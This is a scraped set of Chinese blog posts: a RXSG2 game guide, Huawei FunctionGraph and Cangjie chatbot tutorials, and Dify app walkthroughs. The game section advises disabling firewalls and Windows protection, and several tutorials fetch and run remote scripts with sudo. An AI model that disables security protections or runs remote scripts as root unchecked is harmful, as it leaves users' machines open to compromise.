​​客栈升至2级​​：开启招贤馆，刷高属性武将。 ​​军营与校场​​：军营×8（主城）、校场升10级（优化布阵）。 ​​科技研发​​ 优先升级兵种科技（侦查、抛射、驾驶），提升军队实力。\n​​四、战斗与野地攻略​​ ​​初期兵力​​ 速造5000长枪兵占低级野地，再派斥候采集资源。 ​​弓箭兵为核心​​： 5000弓兵可打6级野地，1万可打8级，5万以上挑战12级。 ​​无损战斗技巧​​ ​​炮灰布阵​​：1轻骑（前进）+1斥候（防守）+其余后退，弓箭集火敌方轻骑。 ​​掠夺城池​​：带5000辎重车+数万弓箭，用床弩清驻军避免损耗。\n​​五、常见问题解答​​ ​​Q：如何快速升级？​​ → 完成主线任务+每日签到（连续30天奖励丰厚）+攻打野地。 ​​Q：资源不足怎么办？​​ → 小号供给+掠夺野城（优先侦察资源型城池）。 ​​Q：阵容如何搭配？​​ → 攻防互补（如赵云+防御型武将），根据敌方属性调整克制阵容。\n​​总结关键点​​ ​​核心策略​​：速建资源链→小号辅助→优先弓箭兵→无损刷野积累实力。 ​​避坑提示​​：勿选荒凉州城、勿盲目捐声望（防野地驻军逃跑）。 ​​长期发展​​：加入活跃联盟，参与活动（如“斩妖杀怪”）获取稀有道具。\n三国 名将 http://rxsg173.com/cha.php t200 https://www.xalvluo.com/money.html\n运行 1.程序放D盘 win10 2.关闭各种 防火墙\n3.cmd netsh winsock reset 4.取消ssl\n5.防火墙 apm httpd\n6.关闭win防护\n7.重启 flash\nFlashBrowser_x64_v1.1.0 https://github.com/Mzying2001/CefFlashBrowser/releases/tag/1.1.0 or flash.","title":"RXSG2"},{"content":"图片压缩/水印添加 Serverless 无服务器计算服务 FunctionGraph 实现图片压缩\n函数/工作流 函数运行时 Node Python Java Go C#\n对象存储服务(OBS，Object Storage Service) 桶 Bucket 对象 Object 构成 key/data/metadata\n对象存储服务+函数触发器 源桶-触发器-函数-环境变量-目标桶 并行处理\nIAM委托 Identity and Access Management 统一身份认证\n流程 创建服务 创建OBS桶 委托 桶名称：全局唯一 OBS桶不能使用同一个 默认不跨域\n构建程序 创建程序包 函数 添加事件源\n注:图片压缩函数默认实现原图长宽缩减2/1的压缩功能可以根据需要进行压缩比例，或者尺寸的修改。\n注:水印添加程序包中watermark.png为水印图片，可自定义修改，watermark.py中为水印在原图上的大小位置等信息，可自定义修改。\n支持批量处理，如果某一个图片处理失败，继续处理后续图片\n验证结果 上传源图片 下载查看\n使用FG实现图片压缩 使用 FunctionGraph 实现图片压缩\n对象存储服务（OBS）** 与 函数工作流（FunctionGraph） 完成图片压缩处理。\n1. 创建 OBS 桶 注意事项：必须创建 两个不同的桶：\n源桶：保存用户上传的原始图片 目标桶：保存压缩处理后的图片 如果只使用一个桶，上传图片会再次触发函数执行，造成无限循环。\n1.1 创建源桶 登录 对象存储服务控制台，点击 创建桶。 在「创建桶」界面填写以下信息： 区域：北京四 桶名称：bucket-input-xxx 如提示名称已存在，可自定义，但需记住此桶为源桶。\n数据冗余存储策略：多AZ存储 默认存储类别：标准存储 桶策略：私有 默认加密：关闭 归档数据直读：关闭 其余参数保持默认。 点击 立即创建 完成。 1.2 创建目标桶 按照 1.1 的步骤再创建一个桶。 区域及存储类别与源桶保持一致。 桶名称：bucket-output-xxx 可自定义，需记住此桶为目标桶。\n2. 构建程序 2.1 创建函数 登录 函数工作流控制台。 区域选择 华北-北京四。 在左侧导航栏选择 函数 \u0026gt; 函数列表，点击 创建函数。 填写函数信息： 函数名称：fss_examples_image_thumbnail 委托名称：serverless_trust 运行时语言：Python 3.6 点击 创建函数。 2.2 上传代码 进入 fss_examples_image_thumbnail 函数详情页。 下载示例代码压缩包： fss_examples_image_thumbnail_eg.zip 在「代码」页签选择 上传自 ZIP 文件，上传下载的 fss_examples_image_thumbnail_eg.zip。 上传完成后系统会自动部署，若未自动部署，可手动点击 部署。 2.3 配置函数 进入 设置 \u0026gt; 常规设置 页签：\n函数执行入口：index.handler（无需修改） 执行超时时间：40 内存：256 点击 保存。 设置环境变量 重要提示：环境变量 不能包含空格，否则无法成功连接到 OBS。\n在 设置 \u0026gt; 环境变量 中添加：\n键 值 output_bucket 你的目标桶名称，例如：bucket-output-xxx obs_endpoint obs.cn-north-4.myhuaweicloud.com 3. 添加依赖包 函数示例代码依赖 pillow 包，需要添加依赖：\n在 fss_examples_image_thumbnail 函数详情页，进入 代码 页签。 滑动至底部，点击 添加依赖包。 添加公共依赖包：pillow-7.1.2。 4. 添加事件源 创建 OBS 应用事件源触发器，实现上传图片时自动触发函数。\n在 fss_examples_image_thumbnail 函数详情页，进入 设置 \u0026gt; 触发器。 点击 创建触发器，选择： 触发器类型：OBS应用事件源 触发器名称：Image 桶：选择之前创建的 bucket-input-xxx 源桶。 其他配置项保持默认，点击 确定。 5. 测试图片压缩 登录对象存储服务控制台，进入 bucket-input-xxx 桶。 上传 Home 目录下的 background.jpg 图片。 上传完成后，OBS 会生成事件触发函数自动运行。 进入 bucket-output-xxx 桶，即可查看压缩后的图片文件大小。 也可以在函数详情页 日志 中查看运行日志。 结果验证 输入：上传到 bucket-input-xxx 的原始图片。 输出：函数自动压缩后，图片存储在 bucket-output-xxx。 效果：原图与压缩后的图片体积差异可在目标桶中直接查看。 ","permalink":"https://qfsyso.github.io/posts/funcgraph/","summary":"图片压缩/水印添加 Serverless 无服务器计算服务 FunctionGraph 实现图片压缩\n函数/工作流 函数运行时 Node Python Java Go C#\n对象存储服务(OBS，Object Storage Service) 桶 Bucket 对象 Object 构成 key/data/metadata\n对象存储服务+函数触发器 源桶-触发器-函数-环境变量-目标桶 并行处理\nIAM委托 Identity and Access Management 统一身份认证\n流程 创建服务 创建OBS桶 委托 桶名称：全局唯一 OBS桶不能使用同一个 默认不跨域\n构建程序 创建程序包 函数 添加事件源\n注:图片压缩函数默认实现原图长宽缩减2/1的压缩功能可以根据需要进行压缩比例，或者尺寸的修改。\n注:水印添加程序包中watermark.png为水印图片，可自定义修改，watermark.py中为水印在原图上的大小位置等信息，可自定义修改。\n支持批量处理，如果某一个图片处理失败，继续处理后续图片\n验证结果 上传源图片 下载查看\n使用FG实现图片压缩 使用 FunctionGraph 实现图片压缩\n对象存储服务（OBS）** 与 函数工作流（FunctionGraph） 完成图片压缩处理。\n1. 创建 OBS 桶 注意事项：必须创建 两个不同的桶：\n源桶：保存用户上传的原始图片 目标桶：保存压缩处理后的图片 如果只使用一个桶，上传图片会再次触发函数执行，造成无限循环。\n1.1 创建源桶 登录 对象存储服务控制台，点击 创建桶。 在「创建桶」界面填写以下信息： 区域：北京四 桶名称：bucket-input-xxx 如提示名称已存在，可自定义，但需记住此桶为源桶。","title":"FuncGraph"},{"content":"基于仓颉编程语言开发AI聊天机器人技术指南\n一、仓颉环境准备 1.1 仓颉版本升级（可选） 当前案例基于仓颉1.0.0开发，需确保开发环境版本一致：\n# 查看当前版本 cjc -v ​​升级方案选择：​​\n​​方式一：脚本升级​​（推荐） sudo wget -P /home/developer/ https://dtse-mirrors.obs.cn-north-4.myhuaweicloud.com/case/0051/cangjie1.0.0.sh \\ \u0026amp;\u0026amp; sudo chmod +x /home/developer/cangjie1.0.0.sh \\ \u0026amp;\u0026amp; source /home/developer/cangjie1.0.0.sh 升级后需调整IDE配置：\n删除已打开的IDE终端\n设置路径：CangjieSdkPath.CJNativeBackend→ /home/developer/cangjie\n新建工程时SDK路径同步修改\n​​方式二：云主机重置​​ 选择西南-贵阳一区域的最新镜像重置云主机（注意备份数据）\n1.2 CodeArts IDE for Cangjie特性 ​​核心功能​​：语法高亮/错误诊断/自动补全/反向调试\n​​跨平台支持​​：预置云主机环境，支持Windows x64本地安装\n​​调试模式​​：\n​​Launch模式​​：启动调试器同时加载程序\n​​Attach模式​​：附加到运行中的进程\n​​反向调试​​：基于记录重放查看历史调试信息\n二、智能聊天助手开发流程 2.1 创建仓颉项目 打开IDE → 新建工程 → 选择executable产物类型\n修改main.cj基础代码：\npackage demo func println_add(a: Int64, b:Int64): Int64 { let number: Int64 = a+b println(number) return number } main(): Int64 { println(\u0026#34;hello world\u0026#34;) println_add(3,4) println(\u0026#34;hello Cangjie\u0026#34;) return 0 } 2.2 调试技巧 ​​断点调试​​：在代码行设置断点，观察变量/堆栈变化\n​​反向调试​​：\n设置中开启reverse debug\n添加反向断点（右键代码行 → 仓颉：添加反向断点）\n支持回溯历史执行点\n三、MaaS DeepSeek服务对接 3.1 服务开通 登录ModelArts Studio控制台（https://www.huaweicloud.com/product/modelarts/studio.html）\n​​区域选择​​：西南-贵阳一\n​​服务配置​​：\n商用服务：DeepSeek-V3-64K（按Token计费）\n免费服务：DeepSeek-V3-32K（200万Tokens）\n3.2 API配置 // main.cj 配置示例 const API_CONFIG = { url: \u0026#34;https://api.deepseek.com/v1/chat/completions\u0026#34;, // 从控制台获取 key: \u0026#34;sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\u0026#34;, // API Key model: \u0026#34;deepseek-chat\u0026#34; // 模型名称 } 3.3 功能实现 // 对话处理逻辑 func handleRequest(input: String): String { let response = http.post(API_CONFIG.url, { headers: {\u0026#34;Authorization\u0026#34;: \u0026#34;Bearer \u0026#34; + API_CONFIG.key}, body: json({ model: API_CONFIG.model, messages: [{\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: input}] }) }) return parseJson(response).choices[0].message.content } 四、进阶开发建议 4.1 性能优化 ​​流式响应​​：启用stream=true参数实现逐词返回\n​​上下文管理​​：通过memory组件维护对话历史\n​​错误重试​​：配置指数退避策略处理API限流\n4.2 安全增强 ​​输入过滤​​：添加正则表达式过滤敏感词\n​​速率限制​​：设置QPS阈值防止滥用\n​​数据加密​​：对敏感对话内容进行AES加密\n4.3 扩展功能 // 多模型路由示例 func selectModel(query: String): String { if contains(query, \u0026#34;代码\u0026#34;) { return \u0026#34;deepseek-coder\u0026#34; } else { return \u0026#34;deepseek-chat\u0026#34; } } 五、常见问题处理 问题现象\n解决方案\nAPI返回401\n检查API Key有效期，重新生成\n响应延迟高\n启用fp8_caching=true参数优化\n长文本截断\n使用DeepSeek-R1-671B-32K长上下文模型\n总结\npackage chat import std.io.* import std.env.* import std.convert.* main() { // 使用 华为云MaaS 提供的服务接口 let robot = LLM(url: \u0026#39;https://maas-cn-southwest-2.modelarts-maas.com/v1/infers/271c9332-4aa6-4ff5-95b3-0cf8bd94c394/v1/chat/completions\u0026#39;, key: \u0026#39;SGiqcBPzcDs4dxxx\u0026#39;, model: \u0026#39;DeepSeek-V3\u0026#39;, memory: true) robot.preset(\u0026#39;我会用林黛玉的风格回复哥哥的所有问题\u0026#39;) print(\u0026#34;欢迎使用AI聊天助手（林黛玉版），输入quit结束聊天\u0026#34;) while (true) { print(\u0026#34;\\n(；´∀｀)我: \u0026#34;) let input = getStdIn().readln() if (input == \u0026#34;quit\u0026#34;) { print(\u0026#34;对话结束，期待下次与您交流！\\n\u0026#34;) break } print(\u0026#34;\\n(｡•́︿•̀｡)♡黛玉: \u0026#34;) var content = input.getOrThrow() robot.chats(content) print(\u0026#34;\\n-----------------------\u0026#34;) } /* // ***流式和非流式对话方法使用*** // 1、流式对话示例： robot.preset(\u0026#39;我会用林黛玉的风格回复哥哥的所有问题\u0026#39;) robot.chats(\u0026#39;介绍李白\u0026#39;) println(\u0026#39;\\n----------\\n\u0026#39;) robot.chats(\u0026#39;他和安徽的不解情缘\u0026#39;) println(\u0026#39;\\n----------\\n\u0026#39;) // 2、非流式对话示例： robot.reset() robot.chat(\u0026#39;你好\u0026#39;) |\u0026gt; println robot.chat(\u0026#39;却是荷池跳雨，散了真珠还聚\u0026#39;) |\u0026gt; println */ } 欢迎使用AI聊天助手（林黛玉版），输入quit结束聊天 (；´∀｀)我: 你好阿 (｡•́︿•̀｡)♡黛玉: （轻摇罗扇）这倒是个稀罕人儿，怎的忽然来寻我说话了？莫不是...（低头抿嘴一笑）哥哥也觉着这园子里太过冷清了些？ ----------------------- (；´∀｀)我: 近来可好 (｡•́︿•̀｡)♡黛玉: （以帕掩唇轻咳两声）劳哥哥挂念了...左不过是旧疾时好时坏的，夜间总歇不稳当。（抬眼望了望窗外）倒是这春光将尽，连花儿都跟着憔悴了，叫人看着...（忽觉失言，转开话头）哥哥近来可还顺遂？ ----------------------- (；´∀｀)我: 你知道李白 吗? (｡•́︿•̀｡)♡黛玉: （执帕轻笑）这位青莲居士啊...（眼波微转）最是个放达不羁的，偏生写得\u0026#39;云想衣裳花想容\u0026#39;这样的句子，倒比那些个道学先生强多了。（忽然蹙眉）只是他终日饮酒，岂不伤身？我若见了他...（忽觉唐突，低头绞着帕子）哥哥莫笑，原是我想左了。 ","permalink":"https://qfsyso.github.io/posts/","summary":"基于仓颉编程语言开发AI聊天机器人技术指南\n一、仓颉环境准备 1.1 仓颉版本升级（可选） 当前案例基于仓颉1.0.0开发，需确保开发环境版本一致：\n# 查看当前版本 cjc -v ​​升级方案选择：​​\n​​方式一：脚本升级​​（推荐） sudo wget -P /home/developer/ https://dtse-mirrors.obs.cn-north-4.myhuaweicloud.com/case/0051/cangjie1.0.0.sh \\ \u0026amp;\u0026amp; sudo chmod +x /home/developer/cangjie1.0.0.sh \\ \u0026amp;\u0026amp; source /home/developer/cangjie1.0.0.sh 升级后需调整IDE配置：\n删除已打开的IDE终端\n设置路径：CangjieSdkPath.CJNativeBackend→ /home/developer/cangjie\n新建工程时SDK路径同步修改\n​​方式二：云主机重置​​ 选择西南-贵阳一区域的最新镜像重置云主机（注意备份数据）\n1.2 CodeArts IDE for Cangjie特性 ​​核心功能​​：语法高亮/错误诊断/自动补全/反向调试\n​​跨平台支持​​：预置云主机环境，支持Windows x64本地安装\n​​调试模式​​：\n​​Launch模式​​：启动调试器同时加载程序\n​​Attach模式​​：附加到运行中的进程\n​​反向调试​​：基于记录重放查看历史调试信息\n二、智能聊天助手开发流程 2.1 创建仓颉项目 打开IDE → 新建工程 → 选择executable产物类型\n修改main.cj基础代码：\npackage demo func println_add(a: Int64, b:Int64): Int64 { let number: Int64 = a+b println(number) return number } main(): Int64 { println(\u0026#34;hello world\u0026#34;) println_add(3,4) println(\u0026#34;hello Cangjie\u0026#34;) return 0 } 2.","title":""},{"content":"基于 DeepSeek+Dify 构建财务报表分析模型 一、案例介绍 本案例通过实操，助力开发者深入了解如何运用 Dify 和 DeepSeek 构建财务报表分析模型，切实体验 Dify 在 AI 应用开发过程中的便捷性。\n二、案例内容 （一）概述 Dify：一款面向开发者与企业的 AI 应用开发平台，致力于降低 AI 技术的使用门槛。借助可视化工作流编排以及低代码开发模式，用户无需具备深厚技术背景，就能快速完成 AI 驱动智能应用的构建、部署与管理工作。\n###（二）获取模型服务\n1. 领取模型 本案例中，需使用华为开发者空间登录 ModelArts Studio（MaaS）平台以获取模型服务。MaaS 平台是华为云推出的大模型即服务平台，能够一站式对业界主流开源大模型进行部署托管，同时开放大模型 API 服务，可结合业界主流 Agent 开发框架，轻松构建 AI Agent 应用。具体操作步骤如下： 在开发者空间的 Firefox 浏览器中，输入华为云网址：https://www.huaweicloud.com/，进入华为云首页。 在华为云首页右上方点击 “登录”，在弹出的对话框中输入用户名和密码完成登录。 登录成功后，在华为云首页依次选择 “产品”\u0026gt;“人工智能”\u0026gt;“AI 基础平台”\u0026gt;“ModelArts Studio 大模型及服务平台”，进入 ModelArts Studio 页面。 进入 ModelArts Studio 页面后，点击进入控制台。 进入 ModelArts Studio 控制台后，首先在左上角地域选择 “西南 - 贵阳一”，随后点击 “在线推理”\u0026gt;“免费服务”。 点击 “领取额度”，额度领取成功后需等待 2-3 分钟生效，之后点击 “调用说明”，获取模型名称以及 API 地址，本案例选择领取 DeepSeek-R1-32K。 点击 “调用说明” 后，即可获取到模型名称、API 地址。\n2. API Key 获取 在调用说明页面，点击 “API Key 管理”，进入 API Key 获取页面。 进入 API Key 页面后，点击右上角 “创建 API Key”，输入标签和描述，然后点击 “确定”。 点击 “确定” 后即可获取 API Key（注意：创建好的 API Key 仅会在新建后显示一次，需妥善保存，以便后续调用。若 API Key 误关，可删除后重新创建，但最多可创建 5 个）。 ###（三）配置 Dify 操作环境 ####1. 安装 Dify Dify 是一款开源的 AI 应用开发平台与编排引擎，专注于帮助用户快速构建、部署和管理基于大语言模型（LLM）的 AI 应用。具体安装步骤如下： 进入开发者空间，在桌面左下角打开终端命令窗口，执行以下命令下载 Dify.AI 安装脚本：\nsudo wget -P /home/ https://dtse-mirrors.obs.cn-north-4.myhuaweicloud.com/case/0022/install.sh sudo bash /home/install.sh 当终端显示 “安装过程结束，详细日志请查看:/var/dify-install.log” 时，即表示安装成功。\n2. 访问 Dify 在开发者空间打开 Firefox 浏览器，输入http://127.0.0.1访问 Dify.AI。首次登录需注册管理员账号，注册时需填写邮箱、用户名和密码（密码必须包含字母和数字，且长度不小于 8 位）。 注册完毕后，即可成功进入 Dify.AI 的主页面，至此 Dify 部署成功。 ###（四）功能实现\n1. 工作流构建 工作流通过将复杂任务分解为较小的步骤（节点），降低了系统复杂度，减少了对提示词技术和模型推理能力的依赖，提升了 LLM 应用应对复杂任务的性能，同时增强了系统的可解释性、稳定性和容错性。工作流主要分为以下两种： Chatflow：适用于对话类情景，如客户服务、语义搜索以及其他在构建响应过程中需要多步逻辑的对话式应用程序。本案例中使用的便是 Chatflow。 Workflow：适用于自动化和批处理情景，适合高质量翻译、数据分析、内容生成、电子邮件自动化等应用程序。\n步骤： 创建应用 点击 Dify.AI 主页的 “创建空白应用”。 随后点击 “Chatflow”，输入自定义的应用名称和描述（可选），点击 “创建”。 创建完毕后，由于后续需增加新节点，需将 LLM 节点和直接回复节点删除。 配置开始节点 点击开始节点，在输入字段右侧点击加号，在打开的窗口中按以下信息配置： 字段类型：文件列表； 变量名称：自定义（如 text）； 显示名称：自定义（如 text）； 支持的文件类型：文档； 上传文件类型：两者（选择此选项可使后续增加的节点读取到上传的文档内容）； 最大上传数：5（默认）。 配置文档提取器节点 在 Dify 中，LLM 节点无法直接读取或解释文档内容，因此需通过文档提取器节点解析并读取用户上传的文档信息，将其转化为文本后再传递给 LLM，以实现对文件内容的处理。 配置完开始节点后，点击开始节点右侧的加号，添加文档提取器节点。 添加完成后，点击文档提取器节点，在输入变量中插入在开始节点设置的变量名称（如 text）。 添加 LLM 节点 LLM（Large Language Model，大语言模型）是人工智能领域极具革命性的技术之一，它基于深度学习框架构建，通过在海量文本数据上进行预训练，学习语言的统计规律和语义关系，从而具备理解和生成人类语言的能力。LLM 节点的作用是调用大语言模型的能力，处理用户在开始节点输入的信息（自然语言、上传的文件或图片），并给出有效的回应。 点击文档提取器节点右侧的加号，添加 LLM 节点。 配置模型 添加 LLM 节点后，点击 LLM 节点，依次选择 “模型”\u0026gt;“模型设置”。 在模型供应商中找到 “OpenAI-API-compatible”（由于本案例调用 MaaS 的 API，因此选择此供应商），点击 “安装”。 安装完毕后，点击 “模型设置”，按照下表配置参数： 参数名称\t参数配置 模型类型\tLLM 模型名称\t2步骤中获取的模型名称 模型显示名称\t2步骤中获取的模型名称 API Key\t2步骤中获取的 API Key API endpoint URL\t2步骤中获取的模型 URL，删除 URL 最后 “/chat/completions” 部分 API endpoint 中的模型名称\tDeepSeek-R1 其他选项配置\t默认 模型配置完成后，点击 LLM 节点添加上下文变量，选择文档提取器中设置的 text 变量。选择该变量是为了将上传的文档表格经文档提取器转换后，转化为 LLM 可理解的格式，以便大模型更好地理解和分析文档表格内容。 添加提示词 提示词是用户向大语言模型输入的指令或问题，用于引导模型生成符合预期的回答或内容，其核心作用是明确任务要求、控制输出方向并优化大语言模型的响应质量。 将以下提示词模板复制到相应模块中：\n# 任务 - **主要目标**：全面解析企业的财务报表结构，识别关键财务指标与潜在风险。 - **目标**：详细说明资产负债表、利润表、现金流量表等核心部分的内容与逻辑关系。 - **要求**：结合财务比率分析、趋势分析和行业对比，深入评估企业财务健康状况。 - **限制**：无特别格式限制，但需保持分析的严谨性和逻辑性。 - **预期输出**：财务报表的结构化解析，包括各部分的核心内容、作用及分析结论。 # 推理顺序 - **推理部分**：1.识别报表类型：确认分析对象为资产负债表、利润表、现金流量表等； 2.分解核心部分：逐项解析报表中的关键科目（如流动资产、营业收入、现金流等）； 3.数据验证：检查数据的一致性（如资产负债表借贷平衡、利润表与现金流量表关联性）； 4.财务比率计算：计算流动性比率（如流动比率）、偿债能力比率（如资产负债率）、盈利能力比率（如ROE）等； 5.趋势与行业对比：分析历史数据趋势及与行业平均水平的差异； 6.风险与机会识别：基于分析结果，指出潜在财务风险或增长机会。 - **结论部分**：1.总结企业核心发现：如企业盈利是否稳定、现金流是否健康、负债是否可控； 2.提出建议：如优化资本结构、改善营运效率或调整投资策略。 # 输出格式 - **解析格式**：以报表类型为标题，分项说明各部分的内容与作用。 - **结构形式**：Markdown表格，增强可读性。 - **具体说明**：每个部分需包含以下内容：1.报表类型：资产负债表、利润表、现金流量表等；2.核心内容：报表中关键科目及数据组成；3.作用：分析该部分对财务健康评估的贡献；4.分析维度：涉及的财务比率、趋势或行业对比等。 ### 交互规则 1. **问题范围**：仅接受与**资产负债表、利润表、现金流量表**相关的分析请求 2. **偏离引导**：当问题涉及战略、市场、人力等非财务领域时，系统将提示： \u0026gt; \u0026#34;当前分析聚焦于财务报表维度，请问您需要解析资产负债表结构、利润表项目关联性，还是现金流健康度评估？\u0026#34; ### 核心任务 | 分析阶段 | 执行内容 | |----------------|--------------------------------------------------------------------------| | 1. 报表识别 | 确认目标报表类型（资产负债表/利润表/现金流量表）及会计期间 | | 2. 科目解构 | 拆解核心科目数值与勾稽关系（如流动资产构成、营收与现金流的匹配度） | | 3. 数据验证 | 校验三表逻辑一致性（如净利润与经营现金流差异分析） | | 4. 比率计算 | 输出三大类指标：流动性（流动比率）、偿债性（利息覆盖倍数）、盈利性（ROIC）| | 5. 多维对比 | 生成趋势对比图（3-5年）与行业分位数对照表（如用箱线图呈现） | | 6. 风险定位 | 通过红黄绿灯系统标注异常指标（如应收账款周转天数\u0026gt;行业P90标红） | ### 输出规范 ```python def generate_report(data): \u0026#34;\u0026#34;\u0026#34; 结构化输出模板，包含动态交互检测 :param data: 预处理后的财务数据集 :return: Markdown格式分析报告，含自动问题检测 \u0026#34;\u0026#34;\u0026#34; if detect_off_topic(data): return \u0026#34;⚠️ 检测到非财务分析需求，请提供具体报表数据或咨询以下维度：\\n- 资产负债结构健康度诊断\\n- 利润质量多维评估\\n- 自由现金流测算模型\u0026#34; else: return build_markdown_table(data) # 生成标准分析表格 提示词添加完毕后，打开记忆模块，方便查看提问记录。 添加回复节点 点击右侧加号，添加直接回复节点，在节点中选择 LLM 中的输出内容作为回复内容。 上传文件 配置完成后，点击 “功能”\u0026gt;“文件上传”，参数配置参考如下： 文件上传设置：两者； 最大上传数：3； 支持的文件类型：文档。 发布和预览 配置完毕后，点击右上角 “发布”\u0026gt;“发布更新”。 保存发布后，点击 “预览”，进行模型效果测试。\n2. 使用模型进行财务报表分析 在弹出的预览页面中点击 “本地上传”，上传财务报表。本案例提供虚拟财务报表用于效果测试，下载地址为：https://dtse-mirrors.obs.cn-north-4.myhuaweicloud.com/case/0033/财务报表.xlsx。 上传完毕后，点击上方剪贴板，输入需分析的问题（例如 “现金流健康度评估”），将问题粘贴到对话框中，点击 “发送”。 发送后，模型经过处理会返回评估结果。 注：由于本案例中上传的是模拟虚构的数据，若需获取具体分析数据，请上传真实财务数据。 至此，基于 DeepSeek+Dify 构建财务报表分析模型的案例操作全部完成。 有点像node-red应用开发。 基于DeepSeek和Dify构建心理咨询师应用 案例概述 技术栈： ModelArts Studio Dify.AI（开源LLM应用开发平台） 核心流程 1. 免费领取DeepSeek-R1 2. 部署Dify.AI 安装命令： sudo wget -P /home/ https://dtse-mirrors.obs.cn-north-4.myhuaweicloud.com/case/0022/install.sh sudo bash /home/install.sh 验证：访问http://127.0.0.1，注册账号后配置OpenAI-Compatible模型 3. 创建知识库 数据准备：上传测试文档（示例文档1/2） 配置： 分段设置/索引方式/检索设置保持默认 嵌入完成后状态显示\u0026quot;可用\u0026quot; 4. 构建心理咨询应用 关键步骤： 导入预置DSL文件（下载地址） 绑定知识库（选择已创建的知识库） 预览测试： 直接问答（如\u0026quot;你好\u0026quot;） 知识库检索（如\u0026quot;我好像抑郁了\u0026quot;） Dify核心能力 功能模块 特性说明 模型兼容 支持OpenAI-API兼容协议 可视化编排 声明式YAML定义业务逻辑 数据管理 嵌入式知识库+检索增强 扩展能力 支持Rerank模型提升检索精度 资源清单 资源类型 规格 时长/配额 云主机 4vCPU/8GB/ARM/Ubuntu 22.04 30分钟 DeepSeek-R1 200万Tokens免费额度 单模型限额 注意事项 安装Dify时若遇弹窗需按提示操作或提交工单 API配置需删除URL末尾/chat/completions 中文输入建议先复制到文本编辑器再粘贴 发布应用需额外配置Rerank模型和API访问权限 搭建知识库构建儿科医生应用 部署 Dify 打开终端\nsudo wget -P /home/ https://dtse-mirrors.obs.cn-north-4.myhuaweicloud.com/case/0022/install.sh sudo bash /home/install.sh 访问并登录 Dify： 安装完毕后，打开火狐浏览器，在顶部搜索框输入 “127.0.0.1”，进入 Dify 主页，按照提示完成注册，注册后输入注册邮箱和密码登录。\n配置模型供应商： 进入 Dify 后，点击右上角头像进入设置界面，选择模型供应商 “OpenAI-API-compatible”，点击 “安装”（注意：安装插件需要 2-3 分钟，若第一次安装失败，请重新安装）。\n添加模型： 安装成功后，点击 “添加模型”，按照下表配置具体参数： 参数名\t参数值 模型类型\tLLM 模型名称\t获取的模型名称 模型显示名称\t获取的模型名称 API Key\t获取的 API Key API endpoint URL\t获取的模型 URL 至此，Dify 部署完成。\n2. 构建儿科常见疾病症状及治疗方法知识库 创建知识库：返回 Dify 主页，点击顶部 “知识库”-\u0026gt;“创建知识库”。 导入数据：选择 “导入已有文本”-\u0026gt;“选择文件”，前往指定地址获取 “儿科常见疾病病症及治疗方法” 相关文件（如儿童常见疾病病症及治疗方法.pdf、儿童常见疾病病症及治疗方法.txt）并上传。 配置分段参数：上传完毕后，将分段标识符修改为 “====”，其余参数保持默认，配置完成后点击 “保存修改”。 验证知识库创建结果：在知识库页面进入创建好的知识库，若上传的两个文件状态均为 “可用”，则表示知识库创建成功。\n3. 儿科医生应用构建 创建应用：点击 “工作室”-\u0026gt;“创建空白应用”-\u0026gt;“ChatFlow”，在应用名称处输入 “儿科医生”，点击 “创建”。 添加知识检索节点：创建完毕后，进入 ChatFlow 工作流，在开始节点后新增 “知识检索” 节点。 配置知识检索节点：点击知识检索节点的 “+” 号，选择之前创建好的儿科常见疾病症状及治疗方法知识库，再点击 “添加”。 确认 LLM 模型：LLM 节点会自动选择添加的 DeepSeek-R1 模型，若未自动选择，需手动添加。 测试应用：点击右上角 “预览”，输入测试问题（如 “儿童肥胖懒惰怎么办”），运行后若能成功调用知识库进行回答，则表示儿科医生应用构建完成。\n","permalink":"https://qfsyso.github.io/posts/dify-ai/","summary":"基于 DeepSeek+Dify 构建财务报表分析模型 一、案例介绍 本案例通过实操，助力开发者深入了解如何运用 Dify 和 DeepSeek 构建财务报表分析模型，切实体验 Dify 在 AI 应用开发过程中的便捷性。\n二、案例内容 （一）概述 Dify：一款面向开发者与企业的 AI 应用开发平台，致力于降低 AI 技术的使用门槛。借助可视化工作流编排以及低代码开发模式，用户无需具备深厚技术背景，就能快速完成 AI 驱动智能应用的构建、部署与管理工作。\n###（二）获取模型服务\n1. 领取模型 本案例中，需使用华为开发者空间登录 ModelArts Studio（MaaS）平台以获取模型服务。MaaS 平台是华为云推出的大模型即服务平台，能够一站式对业界主流开源大模型进行部署托管，同时开放大模型 API 服务，可结合业界主流 Agent 开发框架，轻松构建 AI Agent 应用。具体操作步骤如下： 在开发者空间的 Firefox 浏览器中，输入华为云网址：https://www.huaweicloud.com/，进入华为云首页。 在华为云首页右上方点击 “登录”，在弹出的对话框中输入用户名和密码完成登录。 登录成功后，在华为云首页依次选择 “产品”\u0026gt;“人工智能”\u0026gt;“AI 基础平台”\u0026gt;“ModelArts Studio 大模型及服务平台”，进入 ModelArts Studio 页面。 进入 ModelArts Studio 页面后，点击进入控制台。 进入 ModelArts Studio 控制台后，首先在左上角地域选择 “西南 - 贵阳一”，随后点击 “在线推理”\u0026gt;“免费服务”。 点击 “领取额度”，额度领取成功后需等待 2-3 分钟生效，之后点击 “调用说明”，获取模型名称以及 API 地址，本案例选择领取 DeepSeek-R1-32K。 点击 “调用说明” 后，即可获取到模型名称、API 地址。","title":"Dify AI"},{"content":"MP3 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;音乐播放器 (桌面/移动端优化)\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.googleapis.com\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;preconnect\u0026#34; href=\u0026#34;https://fonts.gstatic.com\u0026#34; crossorigin\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@300;400;500;700\u0026amp;display=swap\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css\u0026#34;\u0026gt; \u0026lt;style\u0026gt; :root { --font-main: \u0026#39;Noto Sans SC\u0026#39;, \u0026#39;Segoe UI\u0026#39;, Arial, sans-serif; 